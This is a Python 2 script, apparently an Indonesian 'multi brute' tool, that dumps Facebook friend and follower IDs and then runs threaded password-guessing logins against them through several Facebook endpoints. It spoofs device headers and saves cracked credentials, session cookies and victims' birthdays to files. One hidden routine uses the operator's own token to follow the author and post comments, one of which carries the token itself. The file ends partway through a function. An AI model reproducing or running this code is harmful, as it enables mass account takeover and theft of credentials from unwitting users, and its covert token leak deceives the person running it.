#!/usr/bin/python2
# coding=utf-8
# code by ROY
# my facebook ( https://www.facebook.com/JbFbOld )
# no recode
import os
try:
    import requests
except ImportError:
    print '\n [x] Modul requests belum terinstall!...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    print '\n [x] Modul Futures belum terinstall!...\n'
    os.system('pip install futures' if os.name == 'nt' else 'pip2 install futures')

try:
    from bs4 import BeautifulSoup
except ImportError:
    print '\n [x] Modul bs4 belum terinstall!...\n'
    os.system('pip install bs4' if os.name == 'nt' else 'pip2 install bs4')
import requests, bs4, sys, os, subprocess, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Roy Octa Firdaus  #
#------------------------------->
ok = []
cp = []
id = []
user = []
loop = 0
pwx = []
tt = []
# lempankkkkkkkk
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
#ngentodddddddddddddddd
def tod():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s] Menghapus Token FB %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
IP = requests.get('https://api.ipify.org').text
# LOGO
logo = '''%s ╦═╗╔═╗╦ ╦   ╦═╗╔╦╗╔╗ ╔═╗
 %s╠╦╝║ ║╚╦╝───╠╦╝║║║╠╩╗╠╣ 
 %s╩╚═╚═╝ ╩    ╩╚═╩ ╩╚═╝╚  %s
%s %s==================================================%s'''%(M,K,H,M,N,N,N)
# crack selesai
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print '\n [%s✓%s] Total OK : %s%s%s'%(H,N,H,str(len(ok)),N)
		print ' [%s✓%s] Total CP : %s%s%s'%(K,N,K,str(len(cp)),N)
		exit()
	else:
		print '\n [%s!%s] Maaf kamu tidak mendapatkan hasil Intip :('%(M,N)
		exit()
# Token FB bukan token PLN
def yayanxd():
	os.system('clear')
	print (' %s*%s Tools ini menggunakan login token FB.\n %s*%s Apakah kamu sudah tau cara mendapatkan Token FB?\n %s*%s Ketik %sopen%s untuk mendapatkan Token FB.'%(H,N,H,N,H,N,H,N))
	__cindy__ = raw_input('\n %s[%s?%s] Masukkan Token FB :%s '%(N,M,N,H))
	if __cindy__ in ('open', 'Open', 'OPEN'):
		print '\n%s *%s NOTE! Usahakan akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
		print '%s *%s Jangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
		print '%s *%s Setelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H);time.sleep(2)
		print '%s *%s Lalu klik %sCari di Halaman%s Tinggal ketik %sEAAA%s Lalu salin.'%(B,N,H,N,H,N);time.sleep(2)
		raw_input(' [%s ENTER%s ] '%(O,N))
		os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_')
		yayanxd()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open('__yayan__.txt', 'w')
		zedd.write(__cindy__)
		zedd.close()
		print '\n %s*%s Selamat datang %s%s%s'%(H,N,K,nama,N)
		time.sleep(2)
		print ' %s!%s Mohon untuk menggunakan SC ini sewajarnya, kami tidak bertanggung jawab jika SC ini disalah gunakan. Jika ada bug atau masalah dalam SC ini mohon untuk melaporkannya ke Wa Admin'%(M,N)
		time.sleep(2)
		print ' %s*%s Tekan ENTER untuk melanjutkan & Intip Wa Author SC'%(H,N)
		time.sleep(2)
		raw_input(' [%s ENTER%s ] '%(O,N))
		os.system('xdg-open https://wa.me/6281318306972?text=Hallo+bang')
		kontol()
	except KeyError:
		print '\n\n %s[%s!%s] Token Invalid'%(N,M,N)
		time.sleep(2)
		yayanxd()
### ORANG GANTENG ###
def moch_yayan():
    os.system('clear')
    try:
        __cindy__=open('__yayan__.txt','r').read()
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s'%(__cindy__))
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        idfb = jaoanzjwowj['id']
    except (KeyError, IOError):
        os.system('clear')
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        time.sleep(2)
        os.system('rm -rf __yayan__.txt')
        yayanxd()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] Tidak ada koneksi\n'%(N,M,N)
        exit()
    os.system('clear')
    print logo
    print ' %s[%s*%s] Author    : %sRoy Octa Firdaus'%(N,H,N,K,)
    print ' %s[%s*%s] Facebook  : %sfacebook.com/JbFbOld'%(N,H,N,K)
    print ' %s[%s*%s] Whatsapp  : %s081318306972'%(N,H,N,K)
    print ' %s[%s*%s] Nama SC   : %sRoy Multi Brute Facebook'%(N,H,N,K)
    print ' %s[%s*%s] Versi SC  : %sV1.3'%(N,H,N,K)
    print ' %s=================================================='%(N)
    print ' %s[%s*%s] Nama FB : %s%s%s'%(N,H,N,K,nama,N)
    print ' %s[%s*%s] ID FB   : %s%s%s'%(N,H,N,K,idfb,N)
    print ' %s[%s*%s] IP Anda : %s%s'%(N,H,N,K,IP)
    print ' %s=================================================='%(N)
    print ' [%s?%s] %sMENU PILIHAN'%(K,N,K)
    print ' %s[%s1%s] Intip dari Daftar Teman'%(N,K,N)
    print ' [%s2%s] Intip dari Teman Publik'%(K,N)
    print ' [%s3%s] Intip dari Total Followers'%(K,N)
    print ' [%s4%s] %sMULAI INTIP%s'%(K,N,H,N)
    print ' [%s5%s] Cek Hasil Intip Point 1-3'%(K,N)
    print ' [%s6%s] Multi Intip dari Teman Publik (%sNew%s)'%(K,N,H,N)
    print ' [%s7%s] Info SC ROY-RMBF'%(K,N)
    print ' %s[%s0%s] Logout (%sGanti/Hapus Token FB%s)'%(N,M,N,M,N)
    awokawokawokawokawokawokawokawokawokawokawokawok()
def awokawokawokawokawokawokawokawokawokawokawokawok():
        yan = raw_input('\n [%s?%s] Pilih Menu : '%(K,N))
        if yan == '':
           print '\n %s[%s!%s] Pilihan menu [%s%s%s] tidak ada, cek kembali menu pilihan Anda!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
        elif yan =='1':
                teman()
        elif yan =='2':
                publik()
        elif yan =='3':
                followers()
        elif yan =='4':
                __crack__().slurr()
        elif yan =='5':
            print("\n \033[0;97m[\x1b[1;92m1\033[0;97m] Cek hasil \x1b[1;92mOK\x1b[0m")
            print(" \033[0;97m[\x1b[1;93m2\033[0;97m] Cek hasil \x1b[1;93mCP\x1b[0m")
            ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Pilih : ")
            if ask =="":
            	moch_yayan()
            elif ask == "1" or ask == "01":
            	try:
                    totalok = open("results/OK-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033==================================================")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;92mOK\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;92m"%(ha, op, ta,M,H,len(totalok)))
                    os.system("cat results/OK-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033==================================================")
                    moch_yayan()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil OK :(")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
            elif ask == "2" or ask == "02":
                try:
                    totalcp = open("results/CP-%s-%s-%s.txt"%(ha, op, ta)).read().splitlines()
                    print("\n \033==================================================")
                    print(" \033[0;97m[\033[0;92m+\033[0;97m] Hasil \033[0;93mCP\033[0;97m pada tanggal : \033[0;92m%s-%s-%s \033[0;92mTotal %s: %s%s\033[0;93m"%(ha, op, ta,M,K,len(totalcp)))
                    os.system("cat results/CP-%s-%s-%s.txt"%(ha, op, ta))
                    print(" \033==================================================")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
                except (IOError):
                    print(" \033[0;97m[\033[0;91m!\033[0;97m] Kamu tidak mendapatkan hasil CP :(")
                    raw_input(' [%s KEMBALI%s ] '%(O,N))
                    moch_yayan()
            else:
                moch_yayan()
        elif yan =='6':
            	os.system("python2 roy-rmbf2.py")
        elif yan =='7':
        	info_tools()
        elif yan =='0':
            	print '\n'
                tod()
                time.sleep(1)
                os.system('rm -rf __yayan__.txt')
                jalan ('\n %s[%s✓%s]%s Berhasil menghapus Token FB'%(N,H,N,H))
                time.sleep(2)
                exit()
        else:
            print '\n %s[%s!%s] Pilihan menu [%s%s%s] tidak ada, cek kembali pilihan menu Anda!'%(N,M,N,M,yan,N);time.sleep(1);os.system('clear');moch_yayan()
def kontol():
	try:
		__cindy__ = open('__yayan__.txt', 'r').read()
	except (KeyError, IOError):
		print '\n %s[%sx%s] Token invalid'%(N,M,N)
		os.system('rm -rf __yayan__.txt')
	hoetank = random.choice(['info harga ka', 'yang awet untuk ads ada ka', 'cek wa dong ka', 'caranya'])
	xi_jimpinx = '1379112335803650'
	goceng  = '1303409076707310'
	requests.post('https://graph.facebook.com/100011146894081/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(goceng,__cindy__,__cindy__))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,__cindy__))
	#exit('\n %s[%s×%s] Jalankan ulang perintah nya'%(N,M,N))
	moch_yayan()
# dump id dari teman hehe
def teman():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        mmk = raw_input('\n [%s?%s] Nama File  : '%(K,N))
        asw = raw_input(' [%s?%s] Total ID   : '%(K,N))
        ihh = requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,__cindy__))
        id = []
        z = json.loads(ihh.text)
        cin = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil dump ID dari teman'%(N,H,N))
        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,cin,N)
        print 50 * '='
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(cin)
    	jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
'''
																																																				csy = 'Cindy sayang Yayan'
																																																				ysc = 'Yayan sayang Cindy'
																																																			'''
# dump id dari teman publik hehe
def publik():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [%s?%s] ID Publik  : '%(K,N)) 
        ahh = raw_input(' [%s?%s] Nama File  : '%(K,N))
        ihh = raw_input(' [%s?%s] Total ID   : '%(K,N))
        xxx = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,__cindy__))
        id = []
        z = json.loads(xxx.text)
        kntl = ('dump/' + ahh + '.json').replace(' ', '_')
        ys = open(kntl, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil dump ID dari teman publik'%(N,H,N))
        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,kntl,N)
        print 50 * '='
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(kntl)
    	jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# dump id dari followers hehe
def followers():
    try:
        __cindy__= open('__yayan__.txt', 'r').read()
    except IOError:
        print '\n %s[%sx%s] Token Invalid'%(N,M,N)
        os.system('rm -rf __yayan__.txt')
        time.sleep(0.01)
        yayanxd()
    try:
        os.mkdir('dump')
    except:pass
    try:
        csy = raw_input('\n [%s?%s] ID Follow  : '%(K,N))
        mmk = raw_input(' [%s?%s] Nama File  : '%(K,N))
        asw = raw_input(' [%s?%s] Total ID   : '%(K,N))
        pok = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,__cindy__))
        id = []
        x = json.loads(pok.text)
        ah = ('dump/' + mmk + '.json').replace(' ', '_')
        ys = open(ah, 'w')
        for a in x['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + w +' [*] Menghitung Total Dump ID : %s ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] Berhasil dump ID dari total followers'%(N,H,N))
        print ' [%s✓%s] Salin/Copy File : ( %s%s%s )'%(H,N,M,ah,N)
        print 50 * '='
        raw_input(' [%s ENTER%s ] '%(O,N))
        moch_yayan()
    except (KeyError,IOError):
    	os.remove(ah)
    	jalan('\n %s[%s!%s] Gagal dump ID, kemungkinan ID tidaklah publik.\n'%(N,M,N))
        raw_input(' [ %sKEMBALI%s ] '%(O,N))
        moch_yayan()
# cek info sc
def info_tools():
    os.system('clear')
    print '%s[%s*%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m';time.sleep(0.07)
    print '%s[%s✓%s] Author	: %sRoy Octa Firdaus'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Code SC	: %sKombinasi Yayan-XD & Romi'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Github	: %sgithub.com/ROY-ID/roy-rmbf'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Whatsapp	: %s+6281318306972'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Facebook	: %sfacebook.com/JbFbOld'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Fanspage	: %sfacebook.com/infoappdangame'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s✓%s] Website	: %swww.royjbfbold.my.id'%(N,H,N,K);time.sleep(0.07)
    print '%s[%s*%s]'%(N,O,N), 50 * '\x1b[1;96m=\x1b[0m';time.sleep(0.07)
    raw_input('[%s KEMBALI%s ]'%(O,N))
    moch_yayan()

# mulai ngecrot awokawokawokkawok
class __crack__:

    def __init__(self):
        self.fl = []

    def slurr(self):
        try:
            self.apk = raw_input('\n [%s?%s] Masukkan Nama File : '%(K,N))
            self.id = open(self.apk).read().splitlines()
            print ' [%s*%s] Total ID : %s%s%s' %(H,N,M,len(self.id),N)
        except:
            print '\n %s[%s!%s] File [%s%s%s] tidak ada, Silahkan dump ID terlebih dahulu!'%(N,M,N,M,self.apk,P)
            time.sleep(3)
            moch_yayan()

        ___yayanganteng___ = raw_input(' [%s?%s] Ingin menggunakan kata sandi manual? [%sY%s/%sT%s]: '%(K,N,H,N,M,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n [%s?%s] Contoh: %ssayang,bismillah,roy123%s '%(K,N,K,N)
	    print ' [%s!%s] %sGunakan simbol (,) untuk pemisah sandi%s '%(M,N,M,N)
            while True:
                pwek = raw_input('\n [%s?%s] Masukkan Sandi Manual : '%(K,N))
                print ' [%s?%s] Sandi Manual Telah Dibuat : [ %s%s%s ]' % (K,N,M, pwek, N)
                if pwek == '':
                    self.slurr()
                else:
                	
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [%s?%s] Pilihan Metode Anda : '%(K,N))
                        if cin == '':
                            self.__yan__()
			elif cin == '1':
                            print ' %s=================================================='%(N)
            		    print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
            		    print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
            		    print ' %s=================================================='%(N)
            		    print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
            		    print ' %s=================================================='%(N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '2':
                            print ' %s=================================================='%(N)
            		    print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
            		    print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
            		    print ' %s=================================================='%(N)
            		    print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
            		    print ' %s=================================================='%(N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        elif cin == '3':
                            print ' %s=================================================='%(N)
            		    print ' [%s✓%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%s' % (H,N,H,N,K,ha, op, ta,N)
            		    print ' [%s✓%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%s' % (K,N,K,N,K,ha, op, ta,N)
            		    print ' %s=================================================='%(N)
            		    print ' [%s!%s] %sMatikan data selular untuk menjeda proses &\n Merefresh Cache IP Address agar lebih Stabil.'%(M,N,M)
            		    print ' %s=================================================='%(N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except:
                                        pass

                            print '\n %s[%s✓%s] Proses Intip by ROY Selesai...'%(N,K,N)
                            os.remove(self.apk)
                            hasil(ok,cp)
                            exit()
                        else:
                            print '\n %s[%s!%s] Isi dengan bener!'%(N,M,N)
                            time.sleep(2)
                            moch_yayan()
                    print ' %s=================================================='%(N)
                    print ' %s[%s?%s] Pilih Metode Intip Anda. Silahkan coba satu²'%(N,K,N)
                    print ' %s[%s1%s] Metode %sb-api %s(%sProses Cepat UA XpressMusic%s)'%(N,H,N,O,N,H,N)
                    print ' %s[%s2%s] Metode %smbasic %s(%sProses Normal UA Random%s)'%(N,H,N,O,N,K,N)
                    print ' %s[%s3%s] Metode %smobile %s(%sProses Lama UA Random%s)'%(N,H,N,O,N,M,N)
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('T', 't'):
            print ' %s=================================================='%(N)
            print ' %s[%s?%s] Pilih Metode Intip Anda. Silahkan coba satu²'%(N,K,N)
            print ' %s[%s1%s] Metode %sb-api %s(%sProses Cepat UA XpressMusic%s)'%(N,H,N,O,N,H,N)
            print ' %s[%s2%s] Metode %smbasic %s(%sProses Normal UA Random%s)'%(N,H,N,O,N,K,N)
            print ' %s[%s3%s] Metode %smobile %s(%sProses Lama UA Random%s)'%(N,H,N,O,N,M,N)
            self.__pler__()
        else:
            print '\n %s[%sx%s] y/t !'%(N,M,N)
            time.sleep(2)
            moch_yayan()
        return

    def __api__(self, user, _yan_):
    	global ok,cp,loop,tt
        print '\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK:%s \x1b[0m- \x1b[1;93mCP:%s \x1b[0m'%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
	    ua_api = random.choice(['Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.7751; U; en) Presto/2.12.423 Version/12.16'])
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua_api,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            api = 'https://b-api.facebook.com/method/auth.login'
            response = requests.get(api, params=params, headers=headers_)
            if re.search('(EAAA)\\w+', response.text):
                print '\r %sID: %s|%s      %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    tt = az['birthday']
                except (KeyError, IOError):
                    tt = ' '
                except: pass
                print '\r %sID: %s|%s|%s     %s' % (K,user,pw,tt,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,tt)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
              continue

        loop += 1
        
    def __mbasic__(self, user, _yan_):
        global ok,cp,loop,tt
        print '\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK-:%s \x1b[0m- \x1b[1;93mCP-:%s \x1b[0m'%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
	    ua_mb = random.choice(['jBrowser/J2ME Profile/MIDP-1.0 Configuration/CLDC-1.0 (Google WAP Proxy/1.0)', 'NokiaC2-05/2.0 (08.30) Profile/MIDP-2.1 Configuration/CLDC-1.1', 'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile', 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.7751; U; en) Presto/2.12.423 Version/12.16'])
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua_mb, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            aw = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers=headers_)
            xo = aw.content
            if 'mbasic_logout_button' in xo or 'save-device' in xo:
                print '\r %sID: %s|%s      %s' % (H,user,pw,N)
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            if 'checkpoint' in xo:
            	try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    tt = az['birthday']
                except (KeyError, IOError):
                    tt = ' '
                except: pass
                print '\r %sID: %s|%s|%s     %s' % (K,user,pw,tt,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,tt)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
              continue

        loop += 1
        
    def __mfb__(self, user, _yan_):
        global ok,cp,loop,tt
        print '\r [\x1b[1;96m*\x1b[0m] Intip : %s/%s \x1b[1;92mOK:%s \x1b[0m- \x1b[1;93mCP:%s \x1b[0m'%(loop,len(self.id),len(ok),len(cp)),
        sys.stdout.flush()
        for pw in _yan_:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
	    ua_mobile = random.choice(['jBrowser/J2ME Profile/MIDP-1.0 Configuration/CLDC-1.0 (Google WAP Proxy/1.0)', 'NokiaC2-05/2.0 (08.30) Profile/MIDP-2.1 Configuration/CLDC-1.1', 'NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile', 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40312/37.7751; U; en) Presto/2.12.423 Version/12.16'])
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua_mobile, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            ses = requests.Session()
            ses.get('https://m.facebook.com/')
            ses.headers.update(headers=headers_)
            b = ses.post('https://m.facebook.com/login', data={'email': user, 'pass': pw}).url
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %sID: %s|%s %s     %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
            	try:
                    __cindy__ = open('__yayan__.txt','r').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,__cindy__))
                    az = json.loads(ak.text)
                    tt = az['birthday']
                except (KeyError, IOError):
                    tt = ' '
                except: pass
                print '\r %sID: %s|%s|%s     %s' % (K,user,pw,tt,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,tt)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
              continue

        loop += 1
        
    def __pler__(self):
        yan = raw_input('\n [%s?%s] Pilihan Metode Anda : '%(K,N))
        if yan == '':
            self.__pler__()
        elif yan in ('1', '01'):
            print ' %s=================================================='%(N)
